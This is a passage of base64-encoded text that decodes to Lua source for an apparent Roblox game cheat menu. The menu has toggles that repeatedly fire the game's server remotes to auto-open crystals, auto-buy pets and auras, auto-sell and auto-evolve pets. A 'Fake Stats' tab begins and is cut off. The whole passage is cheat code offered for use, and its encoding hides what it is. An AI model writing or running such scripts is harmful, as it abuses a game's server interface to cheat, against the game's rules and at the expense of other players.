QvYXVyYQpsb2NhbCBmdW5jdGlvbiBmaW5kQ3J5c3RhbEZvckl0ZW0oaXRlbU5hbWUpCiAgICBmb3IgY3J5c3RhbE5hbWUsIHBldHMgaW4gcGFpcnMoY3J5c3RhbERhdGEpIGRvCiAgICAgICAgZm9yIF8sIHBldCBpbiBpcGFpcnMocGV0cykgZG8KICAgICAgICAgICAgaWYgcGV0Lm5hbWUgPT0gaXRlbU5hbWUgdGhlbgogICAgICAgICAgICAgICAgcmV0dXJuIGNyeXN0YWxOYW1lCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICByZXR1cm4gbmlsCmVuZAoKLS0gQXV0byBPcGVuIENyeXN0YWxzIFNlY3Rpb24KUGV0U2hvcFRhYjpTZWN0aW9uKHtUaXRsZSA9ICJBdXRvIE9wZW4gQ3J5c3RhbHMifSkKCmxvY2FsIHNlbGVjdGVkQ3J5c3RhbCA9ICJCbHVlIENyeXN0YWwiCmxvY2FsIGF1dG9PcGVuQ3J5c3RhbCA9IGZhbHNlCgpsb2NhbCBjcnlzdGFsRHJvcGRvd24gPSBQZXRTaG9wVGFiOkRyb3Bkb3duKHsKICAgIFRpdGxlID0gIlNlbGVjdCBDcnlzdGFsIiwKICAgIExpc3QgPSB7CiAgICAgICAgIkJsdWUgQ3J5c3RhbCIsICJHcmVlbiBDcnlzdGFsIiwgIkZyb3N0IENyeXN0YWwiLCAiTXl0aGljYWwgQ3J5c3RhbCIsIAogICAgICAgICJJbmZlcm5vIENyeXN0YWwiLCAiTGVnZW5kcyBDcnlzdGFsIiwgIk11c2NsZSBFbGl0ZSBDcnlzdGFsIiwgCiAgICAgICAgIkdhbGF4eSBPcmFjbGUgQ3J5c3RhbCIsICJKdW5nbGUgQ3J5c3RhbCIKICAgIH0sCiAgICBWYWx1ZSA9ICJCbHVlIENyeXN0YWwiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0ZXh0KQogICAgICAgIHNlbGVjdGVkQ3J5c3RhbCA9IHRleHQKICAgIGVuZAp9KQoKUGV0U2hvcFRhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBPcGVuIENyeXN0YWwiLAogICAgRGVzYyA9ICJBdXRvbWF0aWNhbGx5IG9wZW4gc2VsZWN0ZWQgY3J5c3RhbCIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBhdXRvT3BlbkNyeXN0YWwgPSBzdGF0ZQogICAgICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBhdXRvT3BlbkNyeXN0YWwgZG8KICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLm9wZW5DcnlzdGFsUmVtb3RlOkludm9rZVNlcnZlcigib3BlbkNyeXN0YWwiLCBzZWxlY3RlZENyeXN0YWwpCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBBdXRvIEJ1eSBQZXRzICYgQXVyYXMgU2VjdGlvbgpQZXRTaG9wVGFiOlNlY3Rpb24oe1RpdGxlID0gIkF1dG8gQnV5IFBldHMgJiBBdXJhcyJ9KQoKbG9jYWwgc2VsZWN0ZWRQZXQgPSAiIgpsb2NhbCBzZWxlY3RlZEF1cmEgPSAiIgpsb2NhbCBhdXRvQnV5UGV0ID0gZmFsc2UKbG9jYWwgYXV0b0J1eUF1cmEgPSBmYWxzZQoKLS0gUGV0IGRyb3Bkb3duCmxvY2FsIHBldExpc3QgPSB7CiAgICAiQmx1ZSBCaXJkaWUgKEJhc2ljKSIsICJPcmFuZ2UgSGVkZ2Vob2cgKEJhc2ljKSIsICJSZWQgS2l0dHkgKEJhc2ljKSIsICJCbHVlIEJ1bm55IChCYXNpYykiLCAiU2lsdmVyIERvZyAoQmFzaWMpIiwKICAgICJEYXJrIFZhbXB5IChBZHZhbmNlZCkiLCAiRGFyayBHb2xlbSAoQWR2YW5jZWQpIiwgIkdyZWVuIEJ1dHRlcmZseSAoQWR2YW5jZWQpIiwgIlllbGxvdyBCdXR0ZXJmbHkgKEFkdmFuY2VkKSIsCiAgICAiQ3JpbXNvbiBGYWxjb24gKFJhcmUpIiwgIlB1cnBsZSBEcmFnb24gKFJhcmUpIiwgIk9yYW5nZSBQZWdhc3VzIChSYXJlKSIsICJQdXJwbGUgRmFsY29uIChSYXJlKSIsICJSZWQgRHJhZ29uIChSYXJlKSIsCiAgICAiV2hpdGUgUGVnYXN1cyAoUmFyZSkiLCAiRnJvc3R3YXZlIExlZ2VuZHMgUGVuZ3VpbiAoUmFyZSkiLCAiUGhhbnRvbSBHZW5lc2lzIERyYWdvbiAoUmFyZSkiLCAiRXRlcm5hbCBTdHJpa2UgTGV2aWF0aGFuIChSYXJlKSIsCiAgICAiQmx1ZSBQaGVvbml4IChFcGljKSIsICJCbHVlIEZpcmVjYXN0ZXIgKEVwaWMpIiwgIkdvbGRlbiBQaGVvbml4IChFcGljKSIsICJSZWQgRmlyZWNhc3RlciAoRXBpYykiLCAiR3JlZW4gRmlyZWNhc3RlciAoRXBpYykiLAogICAgIldoaXRlIFBoZW9uaXggKEVwaWMpIiwgIkRhcmsgTGVnZW5kcyBNYW50aWNvcmUgKEVwaWMpIiwgIlVsdGltYXRlIFN1cGVybm92YSBQZWdhc3VzIChFcGljKSIsICJMaWdodG5pbmcgU3RyaWtlIFBoYW50b20gKEVwaWMpIiwKICAgICJHb2xkZW4gVmlraW5nIChFcGljKSIsICJJbmZlcm5hbCBEcmFnb24gKFVuaXF1ZSkiLCAiVWx0cmEgQmlyZGllIChVbmlxdWUpIiwgIk1hZ2ljIEJ1dHRlcmZseSAoVW5pcXVlKSIsICJBZXRoZXIgU3Bpcml0IEJ1bm55IChVbmlxdWUpIiwKICAgICJDeWJlcm5ldGljIFNob3dkb3duIERyYWdvbiAoVW5pcXVlKSIsICJEYXJrc3RhciBIdW50ZXIgKFVuaXF1ZSkiLCAiTXVzY2xlIFNlbnNlaSAoVW5pcXVlKSIsICJOZW9uIEd1YXJkaWFuIChVbmlxdWUpIgp9Cgpsb2NhbCBwZXREcm9wZG93biA9IFBldFNob3BUYWI6RHJvcGRvd24oewogICAgVGl0bGUgPSAiU2VsZWN0IFBldCIsCiAgICBMaXN0ID0gcGV0TGlzdCwKICAgIFZhbHVlID0gIiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHRleHQpCiAgICAgICAgc2VsZWN0ZWRQZXQgPSB0ZXh0CiAgICBlbmQKfSkKCi0tIEF1cmEgZHJvcGRvd24KbG9jYWwgYXVyYUxpc3QgPSB7CiAgICAiQmx1ZSBBdXJhIChCYXNpYykiLCAiR3JlZW4gQXVyYSAoQmFzaWMpIiwgIlB1cnBsZSBBdXJhIChCYXNpYykiLCAiUmVkIEF1cmEgKEJhc2ljKSIsICJZZWxsb3cgQXVyYSAoQmFzaWMpIiwKICAgICJVbHRyYSBJbmZlcm5vIChSYXJlKSIsICJBenVyZSBUdW5kcmEgKEVwaWMpIiwgIkdyYW5kIFN1cGVybm92YSAoRXBpYykiLCAiTXVzY2xlIEtpbmcgKFVuaXF1ZSkiLCAKICAgICJFbnRyb3BpYyBCbGFzdCAoVW5pcXVlKSIsICJFdGVybmFsIE1lZ2FzdHJpa2UgKFVuaXF1ZSkiCn0KCmxvY2FsIGF1cmFEcm9wZG93biA9IFBldFNob3BUYWI6RHJvcGRvd24oewogICAgVGl0bGUgPSAiU2VsZWN0IEF1cmEiLAogICAgTGlzdCA9IGF1cmFMaXN0LAogICAgVmFsdWUgPSAiIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odGV4dCkKICAgICAgICBzZWxlY3RlZEF1cmEgPSB0ZXh0CiAgICBlbmQKfSkKClBldFNob3BUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIkF1dG8gQnV5IFBldCIsCiAgICBEZXNjID0gIkF1dG9tYXRpY2FsbHkgYnV5IHNlbGVjdGVkIHBldCIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBhdXRvQnV5UGV0ID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSBhbmQgc2VsZWN0ZWRQZXQgfj0gIiIgdGhlbgogICAgICAgICAgICBsb2NhbCBwZXROYW1lID0gc2VsZWN0ZWRQZXQ6bWF0Y2goIl4oLi0pJXMqJSgiKSBvciBzZWxlY3RlZFBldAogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIGF1dG9CdXlQZXQgZG8KICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHBldFRvQnV5ID0gUmVwbGljYXRlZFN0b3JhZ2UuY1BldFNob3BGb2xkZXI6RmluZEZpcnN0Q2hpbGQocGV0TmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgcGV0VG9CdXkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuY1BldFNob3BSZW1vdGU6SW52b2tlU2VydmVyKHBldFRvQnV5KQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKClBldFNob3BUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIkF1dG8gQnV5IEF1cmEiLAogICAgRGVzYyA9ICJBdXRvbWF0aWNhbGx5IGJ1eSBzZWxlY3RlZCBhdXJhIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGF1dG9CdXlBdXJhID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSBhbmQgc2VsZWN0ZWRBdXJhIH49ICIiIHRoZW4KICAgICAgICAgICAgbG9jYWwgYXVyYU5hbWUgPSBzZWxlY3RlZEF1cmE6bWF0Y2goIl4oLi0pJXMqJSgiKSBvciBzZWxlY3RlZEF1cmEKICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBhdXRvQnV5QXVyYSBkbwogICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXVyYVRvQnV5ID0gUmVwbGljYXRlZFN0b3JhZ2UuY1BldFNob3BGb2xkZXI6RmluZEZpcnN0Q2hpbGQoYXVyYU5hbWUpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGF1cmFUb0J1eSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5jUGV0U2hvcFJlbW90ZTpJbnZva2VTZXJ2ZXIoYXVyYVRvQnV5KQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEF1dG8gU2VsbCBQZXRzIFNlY3Rpb24KUGV0U2hvcFRhYjpTZWN0aW9uKHtUaXRsZSA9ICJBdXRvIFNlbGwgUGV0cyJ9KQoKbG9jYWwgc2VsZWN0ZWRTZWxsUGV0ID0gIiIKbG9jYWwgYXV0b1NlbGxQZXQgPSBmYWxzZQoKbG9jYWwgc2VsbFBldERyb3Bkb3duID0gUGV0U2hvcFRhYjpEcm9wZG93bih7CiAgICBUaXRsZSA9ICJTZWxlY3QgUGV0IHRvIFNlbGwiLAogICAgTGlzdCA9IHsKICAgICAgICAiQmx1ZSBCaXJkaWUiLCAiT3JhbmdlIEhlZGdlaG9nIiwgIlJlZCBLaXR0eSIsICJCbHVlIEJ1bm55IiwgIlNpbHZlciBEb2ciLAogICAgICAgICJEYXJrIFZhbXB5IiwgIkRhcmsgR29sZW0iLCAiR3JlZW4gQnV0dGVyZmx5IiwgIlllbGxvdyBCdXR0ZXJmbHkiLAogICAgICAgICJDcmltc29uIEZhbGNvbiIsICJQdXJwbGUgRHJhZ29uIiwgIk9yYW5nZSBQZWdhc3VzIiwgIlB1cnBsZSBGYWxjb24iLCAiUmVkIERyYWdvbiIsCiAgICAgICAgIldoaXRlIFBlZ2FzdXMiLCAiRnJvc3R3YXZlIExlZ2VuZHMgUGVuZ3VpbiIsICJQaGFudG9tIEdlbmVzaXMgRHJhZ29uIiwgIkV0ZXJuYWwgU3RyaWtlIExldmlhdGhhbiIsCiAgICAgICAgIkJsdWUgUGhlb25peCIsICJCbHVlIEZpcmVjYXN0ZXIiLCAiR29sZGVuIFBoZW9uaXgiLCAiUmVkIEZpcmVjYXN0ZXIiLCAiR3JlZW4gRmlyZWNhc3RlciIsCiAgICAgICAgIldoaXRlIFBoZW9uaXgiLCAiRGFyayBMZWdlbmRzIE1hbnRpY29yZSIsICJVbHRpbWF0ZSBTdXBlcm5vdmEgUGVnYXN1cyIsICJMaWdodG5pbmcgU3RyaWtlIFBoYW50b20iLAogICAgICAgICJHb2xkZW4gVmlraW5nIiwgIkluZmVybmFsIERyYWdvbiIsICJVbHRyYSBCaXJkaWUiLCAiTWFnaWMgQnV0dGVyZmx5IiwgIkFldGhlciBTcGlyaXQgQnVubnkiLAogICAgICAgICJDeWJlcm5ldGljIFNob3dkb3duIERyYWdvbiIsICJEYXJrc3RhciBIdW50ZXIiLCAiTXVzY2xlIFNlbnNlaSIsICJOZW9uIEd1YXJkaWFuIgogICAgfSwKICAgIFZhbHVlID0gIiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHRleHQpCiAgICAgICAgc2VsZWN0ZWRTZWxsUGV0ID0gdGV4dAogICAgZW5kCn0pCgpQZXRTaG9wVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIFNlbGwgUGV0IiwKICAgIERlc2MgPSAiQXV0b21hdGljYWxseSBzZWxsIHNlbGVjdGVkIHBldCIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBhdXRvU2VsbFBldCA9IHN0YXRlCiAgICAgICAgaWYgc3RhdGUgYW5kIHNlbGVjdGVkU2VsbFBldCB+PSAiIiB0aGVuCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgYXV0b1NlbGxQZXQgZG8KICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGZvdW5kUGV0ID0gbmlsCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCBmb2xkZXIgaW4gcGFpcnMocGxheWVyLnBldHNGb2xkZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGZvbGRlcjpJc0EoIkZvbGRlciIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBwZXQgPSBmb2xkZXI6RmluZEZpcnN0Q2hpbGQoc2VsZWN0ZWRTZWxsUGV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHBldCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvdW5kUGV0ID0gcGV0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGZvdW5kUGV0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLnNlbGxQZXRFdmVudDpGaXJlU2VydmVyKCJzZWxsUGV0IiwgZm91bmRQZXQpCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF1dG9TZWxsUGV0ID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBBdXRvIEV2b2x2ZSBQZXRzIFNlY3Rpb24KUGV0U2hvcFRhYjpTZWN0aW9uKHtUaXRsZSA9ICJBdXRvIEV2b2x2ZSBQZXRzIn0pCgpsb2NhbCBzZWxlY3RlZFJhcml0eSA9ICIiCmxvY2FsIGF1dG9Fdm9sdmUgPSBmYWxzZQoKbG9jYWwgZXZvbHZlRHJvcGRvd24gPSBQZXRTaG9wVGFiOkRyb3Bkb3duKHsKICAgIFRpdGxlID0gIlNlbGVjdCBSYXJpdHkgdG8gRXZvbHZlIiwKICAgIExpc3QgPSB7IkJhc2ljIiwgIkFkdmFuY2VkIiwgIlJhcmUiLCAiRXBpYyIsICJVbmlxdWUifSwKICAgIFZhbHVlID0gIiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHRleHQpCiAgICAgICAgc2VsZWN0ZWRSYXJpdHkgPSB0ZXh0CiAgICBlbmQKfSkKClBldFNob3BUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIkF1dG8gRXZvbHZlIFBldHMiLAogICAgRGVzYyA9ICJBdXRvbWF0aWNhbGx5IGV2b2x2ZSBwZXRzIG9mIHNlbGVjdGVkIHJhcml0eSIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBhdXRvRXZvbHZlID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSBhbmQgc2VsZWN0ZWRSYXJpdHkgfj0gIiIgdGhlbgogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIGF1dG9Fdm9sdmUgZG8KICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCBmb2xkZXIgaW4gcGFpcnMocGxheWVyLnBldHNGb2xkZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGZvbGRlcjpJc0EoIkZvbGRlciIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgcGV0IGluIHBhaXJzKGZvbGRlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgY3J5c3RhbE5hbWUsIHBldHMgaW4gcGFpcnMoY3J5c3RhbERhdGEpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgcGV0RGF0YSBpbiBpcGFpcnMocGV0cykgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBwZXREYXRhLm5hbWUgPT0gcGV0Lk5hbWUgYW5kIHBldERhdGEucmFyaXR5ID09IHNlbGVjdGVkUmFyaXR5IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMucGV0RXZvbHZlRXZlbnQ6RmlyZVNlcnZlcigiZXZvbHZlUGV0IiwgcGV0Lk5hbWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKUGV0U2hvcFRhYjpCdXR0b24oewogICAgVGl0bGUgPSAiRXZvbHZlIFNlbGVjdGVkIFJhcml0eSBPbmNlIiwKICAgIERlc2MgPSAiRXZvbHZlIGFsbCBwZXRzIG9mIHNlbGVjdGVkIHJhcml0eSBvbmNlIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGlmIHNlbGVjdGVkUmFyaXR5ID09ICIiIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgbG9jYWwgZXZvbHZlZENvdW50ID0gMAogICAgICAgICAgICBmb3IgXywgZm9sZGVyIGluIHBhaXJzKHBsYXllci5wZXRzRm9sZGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBmb2xkZXI6SXNBKCJGb2xkZXIiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHBldCBpbiBwYWlycyhmb2xkZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGNyeXN0YWxOYW1lLCBwZXRzIGluIHBhaXJzKGNyeXN0YWxEYXRhKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHBldERhdGEgaW4gaXBhaXJzKHBldHMpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcGV0RGF0YS5uYW1lID09IHBldC5OYW1lIGFuZCBwZXREYXRhLnJhcml0eSA9PSBzZWxlY3RlZFJhcml0eSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLnBldEV2b2x2ZUV2ZW50OkZpcmVTZXJ2ZXIoImV2b2x2ZVBldCIsIHBldC5OYW1lKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBldm9sdmVkQ291bnQgPSBldm9sdmVkQ291bnQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjA1KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBXaW5kb3c6Tm90aWZ5KHsKICAgICAgICAgICAgICAgIFRpdGxlID0gIkV2b2x2ZSBDb21wbGV0ZSIsCiAgICAgICAgICAgICAgICBEZXNjID0gIkV2b2x2ZWQgIiAuLiBldm9sdmVkQ291bnQgLi4gIiAiIC4uIHNlbGVjdGVkUmFyaXR5IC4uICIgcGV0cyIsCiAgICAgICAgICAgICAgICBUaW1lID0gMwogICAgICAgICAgICB9KQogICAgICAgIGVuZCkKICAgIGVuZAp9KQoKLS0gRmFrZSBTdGF0cyBUYWIKbG9jYWwgRmFrZVN0YXRzVGFiID0gV2luZG93OlRhYih7VGl0bGUgPSAiRmFrZSBTdGF0cyIsIEljb24gPSAidHJlbmRpbmctdXAifSkKCi0tIEZha2Ugc3RhdHMgc3RvcmFnZQpsb2NhbCBmYWtlU3RhdHMgPSB7CiAgICBTdHJlbmd0aCA9IDAsCiAgICBEdXJhYmlsaXR5ID0gMCwKICAgIFJlYmlydGhzID0gMCwKICAgIEdlbXMgPSAwLAogICAgS2lsbHMgPSAwLAogICAgQnJhd2xzID0gMCwKICAgIEFnaWxpdHkgPSAwLAogICAgR29vZEthcm1hID0gMCwKICAgIEV2aWxLYXJtYSA9IDAKfQoKLS0gVG9nZ2xlIHN0YXRlcyBmb3IgZWFjaCBzdGF0CmxvY2FsIHRvZ2dsZVN0YXRlcyA9IHsKICAgIFN0cmVuZ3RoID0gZmFsc2UsCiAgICBEdXJhYmlsaXR5ID0gZmFsc2UsCiAgICBSZWJpcnRocyA9IGZhbHNlLAogICAgR2VtcyA9IGZhbHNlLAogICAgS2lsbHMgPSBmYWxzZSwKICAgIEJyYXdscyA9IGZhbHNlLAogICAgQWdpbGl0eSA9IGZhbHNlLAogICAgR29vZEthcm1hID0gZmFsc2UsCiAgICBFdmlsS2FybWEgPSBmYWxzZQp9CgotLSBGdW5jdGlvbiB0byBmb3JtYXQgbnVtYmVycyB3aXRoIGFiYnJldmlhdGlvbnMKbG9jYWwgZnVuY3Rpb24gZm9ybWF0TnVtYmVyKG51bSkKICAgIGlmIG5vdCBudW0gdGhlbiByZXR1cm4gIjAiIGVuZAogICAgbnVtID0gdG9udW1iZXIobnVtKSBvciAwCiAgICAKICAgIGxvY2FsIGZvcm1hdHMgPSB7CiAgICAgICAgezFlMTgsICJRaSJ9LCB7MWUxNSwgIlFhIn0sIHsxZTEyLCAiVCJ9LCAKICAgICAgICB7MWU5LCAiQiJ9LCB7MWU2LCAiTSJ9LCB7MWUzLCAiSyJ9CiAgICB9CiAgICAKICAgIGZvciBfLCBmb3JtYXQgaW4gaXBhaXJzKGZvcm1hdHMpIGRvCiAgICAgICAgaWYgbnVtID49IGZvcm1hdFsxXSB0aGVuCiAgICAgICAgICAgIHJldHVybiBzdHJpbmcuZm9ybWF0KCIlLjFmJXMiLCBudW0gLyBmb3JtYXRbMV0sIGZvcm1hdFsyXSkKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuIHRvc3RyaW5nKG1hdGguZmxvb3IobnVtKSkKZW5kCgotLSBGdW5jdGlvbiB0byBwYXJzZSBpbnB1dCB3aXRoIGFiYnJldmlhdGlvbnMgKE1heDogMTAwMDBRYSkKbG9jYWwgZnVuY3Rpb24gcGFyc2VOdW1iZXIoaW5wdXQpCiAgICBpZiBub3QgaW5wdXQgdGhlbiByZXR1cm4gMCBlbmQKICAgIAogICAgaW5wdXQgPSB0b3N0cmluZyhpbnB1dCk6dXBwZXIoKTpnc3ViKCIlcysiLCAiIikKICAgIAogICAgbG9jYWwgbXVsdGlwbGllcnMgPSB7CiAgICAgICAgWyJRSSJdID0gMWUxOCwgWyJRQSJdID0gMWUxNSwKICAgICAgICBbIlQiXSA9IDFlMTIsIFsiVFIiXSA9IDFlMTIsCiAgICAgICAgWyJCIl0gPSAxZTksIFsiQk4iXSA9IDFlOSwKICAgICAgICBbIk0iXSA9IDFlNiwgWyJNTCJdID0gMWU2LAogICAgICAgIFsiSyJdID0gMWUzLCBbIktOIl0gPSAxZTMKICAgIH0KICAgIAogICAgLS0gQ2hlY2sgaWYgaXQncyBqdXN0IGEgbnVtYmVyCiAgICBsb2NhbCBwbGFpbk51bSA9IHRvbnVtYmVyKGlucHV0KQogICAgaWYgcGxhaW5OdW0gdGhlbgogICAgICAgIHJldHVybiBtYXRoLm1pbihwbGFpbk51bSwgMTAwMDBlMTUpIC0tIENhcCBhdCAxMDAwMFFhCiAgICBlbmQKICAgIAogICAgLS0gQ2hlY2sgZm9yIGFiYnJldmlhdGlvbiBmb3JtYXQgKGUuZy4sICIxLjVLIiwgIjEwME0iLCAiMi4zQiIpCiAgICBmb3IgYWJicmV2LCBtdWx0aXBsaWVyIGluIHBhaXJzKG11bHRpcGxpZXJzKSBkbwogICAgICAgIGxvY2FsIHBhdHRlcm4gPSAiXihbJWQlLl0rKSIgLi4gYWJicmV2IC4uICIkIgogICAgICAgIGxvY2FsIG1hdGNoID0gaW5wdXQ6bWF0Y2gocGF0dGVybikKICAgICAgICBpZiBtYXRjaCB0aGVuCiAgICAgICAgICAgIGxvY2FsIG51bSA9IHRvbnVtYmVyKG1hdGNoKQogICAgICAgICAgICBpZiBudW0gdGhlbgogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGgubWluKG51bSAqIG11bHRpcGxpZXIsIDEwMDAwZTE1KSAtLSBDYXAgYXQgMTAwMDBRYQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICByZX